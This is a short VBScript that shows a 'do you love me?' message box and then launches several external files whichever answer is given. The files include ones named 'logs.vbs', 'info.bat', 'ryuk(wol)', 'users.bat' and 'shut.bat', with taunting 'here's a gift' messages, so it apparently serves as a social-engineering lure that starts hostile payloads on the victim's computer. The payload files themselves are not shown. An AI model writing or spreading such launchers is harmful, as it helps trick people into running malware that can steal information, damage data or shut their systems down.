Sub Run(ByVal sFile)
Dim shell

    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & sFile & Chr(34), 1, false
    Set shell = Nothing
End Sub

dim result
result = msgbox("do you love me?", 4 , "do you love me?")

If result=6 then
msgbox "i love you too.......  here's a gift.....hehehehehehehe"
run "awd.bat"
run "image.jpg"
else
msgbox "but i love you...hehehehehehehe"
run "image.jpg"
run "logs.vbs"
run "info.bat"
run "sys-f"
run "ryuk(wol)"
run "users.bat"
run "shut.bat"
end if
